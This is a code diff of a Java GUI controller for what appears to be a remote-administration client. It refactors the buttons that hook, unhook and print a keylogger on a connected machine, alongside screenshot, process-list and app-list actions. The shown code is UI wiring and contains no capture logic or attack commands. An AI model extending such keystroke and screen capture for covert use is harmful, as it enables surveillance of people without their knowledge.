@@ -18,14 +18,17 @@ public class Controller
         this.login = login;
         this.home = home;
         this.client = client;
+
+        this.client.addController(this);
     }
 
     public void initController()
     {
         login.getConnectButton().addActionListener(e -> connectServer());
-        home.getLogPanel().getHookButton().addActionListener(e -> handleKeyLogger("Hook"));
-        home.getLogPanel().getUnHookButton().addActionListener(e -> handleKeyLogger("Unhook"));
-        home.getLogPanel().getPrintButton().addActionListener(e -> handleKeyLogger("Print"));
+        home.getLogPanel().getHookButton().addActionListener(e -> handleAction("Hook"));
+        home.getLogPanel().getUnHookButton().addActionListener(e -> handleAction("Unhook"));
+        home.getLogPanel().getPrintButton().addActionListener(e -> handleAction("Print"));
+
         home.getScreenPanel().getTakeButton().addActionListener(e -> handleScreenShot("ScreenShot", 1));
         home.getScreenButton().addActionListener(e -> handleScreenShot("ScreenShot", 2));
 
@@ -34,6 +37,24 @@ public class Controller
         home.getProcessPanel().getListButton().addActionListener(e -> handleProcess("ListProcess"));
 
         home.getAppPanel().getListButton().addActionListener(e -> handleApp("ListApp"));
+    }
+
+    private void handleAction(String action) {
+        switch(action) {
+            case "Hook":
+            case "Unhook":
+            case "Print":
+                client.handleAction(action);
+                break;
+        }
+    }
+
+    public void handleReturnedValue(String action, String out) {
+        home.getLogPanel().getKeyTextArea().setText(out);
+    }
+
+    public void handleReturnedValue(String action, BufferedImage out) {
+
     }
 
     private void handleApp(String command)
@@ -86,12 +107,6 @@ public class Controller
 //        }
 
         firstTakeScreen = false;
-    }
-    private void handleKeyLogger(String command)
-    {
-        String keylogger = client.handleKeyLogger(command);
-
-        home.getLogPanel().getKeyTextArea().setText(keylogger);
     }
 
     private void connectServer()
